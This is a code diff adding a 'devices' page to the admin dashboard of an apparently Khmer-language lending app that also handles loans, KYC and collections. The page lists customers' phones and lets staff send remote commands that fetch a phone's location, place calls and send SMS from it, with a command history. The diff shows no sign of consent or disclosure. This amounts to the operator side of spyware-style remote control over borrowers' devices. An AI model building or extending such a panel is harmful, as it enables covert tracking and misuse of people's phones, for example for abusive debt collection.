@@ -229,6 +229,7 @@ const TITLES = {
   transactions: 'ប្រតិបត្តិការ', loans: 'កម្ចី', kyc: 'KYC / CRM',
   collections: 'ប្រមូល', reports: 'របាយការណ៍', notifications: 'សេចក្តីសារ',
   data: 'ទិន្នន័យផ្សេង', audit: 'កំណត់ត្រាក្របរបុប',
+  devices: 'គ្រប់គ្រងទូរស័ព្ទ',
 };
 
 async function renderDashboard() {
@@ -1602,11 +1603,123 @@ async function renderAudit() {
 /* ============================================================
    ROUTER
    ============================================================ */
+/* ---------- devices ---------- */
+async function renderDevices() {
+  const [summary, deviceList] = await Promise.all([
+    api('/device/summary'),
+    api('/device/list'),
+  ]);
+
+  const devices = deviceList.devices || [];
+  const recentCmds = summary.recent_commands || [];
+
+  $('#content').innerHTML = `
+    <div class="grid k3">
+      <div class="card kpi accent">
+        <div class="kpi-label">📱 ឧបករណ៍ Online</div>
+        <div class="kpi-value">${summary.total_online || 0}</div>
+        <div class="kpi-sub">ក្នុងចំណោម ${summary.total_users || 0} អ្នកប្រើ</div>
+      </div>
+      <div class="card kpi warn">
+        <div class="kpi-label">⏳ Commands រង់ចាំ</div>
+        <div class="kpi-value">${summary.pending_commands || 0}</div>
+        <div class="kpi-sub">pending + sent</div>
+      </div>
+      <div class="card kpi ok">
+        <div class="kpi-label">✅ សរុប Commands</div>
+        <div class="kpi-value">${recentCmds.length}</div>
+        <div class="kpi-sub">10 ចុងក្រោយ</div>
+      </div>
+    </div>
+
+    <div class="card" style="margin-top:16px">
+      <h3 style="margin:0 0 12px">📡 ឧបករណ៍ទាំងអស់</h3>
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>អ្នកប្រើ</th>
+              <th>ទូរស័ព្ទ</th>
+              <th>Status</th>
+              <th>Actions</th>
+            </tr>
+          </thead>
+          <tbody>
+            ${devices.map(d => `
+              <tr>
+                <td>${esc(d.name)}</td>
+                <td>${esc(d.phone)}</td>
+                <td><span class="dot ${d.online ? 'on' : 'off'}" style="display:inline-block;width:8px;height:8px;border-radius:50%;background:${d.online ? '#22c55e' : '#666'};margin-right:6px"></span>${d.online ? 'Online' : 'Offline'}</td>
+                <td>
+                  <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'get_location')">📍 Location</button>
+                  <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'make_call')">📞 Call</button>
+                  <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'send_sms')">💬 SMS</button>
+                </td>
+              </tr>
+            `).join('')}
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <div class="card" style="margin-top:16px">
+      <h3 style="margin:0 0 12px">📜 Command History</h3>
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>អ្នកប្រើ</th>
+              <th>Command</th>
+              <th>Status</th>
+              <th>Time</th>
+              <th>Result</th>
+            </tr>
+          </thead>
+          <tbody>
+            ${recentCmds.map(c => `
+              <tr>
+                <td>${esc(c.user_name)}</td>
+                <td>${esc(c.command_type)}</td>
+                <td><span style="padding:2px 8px;border-radius:4px;font-size:12px;background:${c.status === 'completed' ? '#22c55e22' : c.status === 'failed' ? '#ef444422' : '#f59e0b22'};color:${c.status === 'completed' ? '#22c55e' : c.status === 'failed' ? '#ef4444' : '#f59e0b'}">${esc(c.status)}</span></td>
+                <td>${dt(c.created_at)}</td>
+                <td>${c.result_data ? esc(JSON.stringify(c.result_data).slice(0, 50)) : '—'}</td>
+              </tr>
+            `).join('')}
+          </tbody>
+        </table>
+      </div>
+    </div>
+  `;
+}
+
+window.sendDeviceCmd = async function(userId, cmdType) {
+  let payload = {};
+  if (cmdType === 'make_call') {
+    const phone = prompt('បញ្ចូលលេខទូរស័ព្ទ:');
+    if (!phone) return;
+    payload = { phone };
+  } else if (cmdType === 'send_sms') {
+    const phone = prompt('បញ្ចូលលេខទូរស័ព្ទអ្នកទទួល:');
+    if (!phone) return;
+    const message = prompt('បញ្ចូលសារ SMS:');
+    if (!message) return;
+    payload = { phone, message };
+  }
+  try {
+    const res = await api('/device/command', 'POST', { user_id: userId, command_type: cmdType, payload });
+    toast(`✅ Command បានផ្ញើ (${res.online ? 'online' : 'offline'})`);
+    renderDevices();
+  } catch (e) {
+    toast(`❌ ${e.message}`, true);
+  }
+};
+
 const RENDERERS = {
   dashboard: renderDashboard, users: renderUsers, cards: renderCards,
   transactions: renderTransactions, loans: renderLoans, kyc: renderKyc,
   collections: renderCollections, reports: renderReports,
   notifications: renderNotifications, data: renderData, audit: renderAudit,
+  devices: renderDevices,
 };
 
 function bindPager(total) {
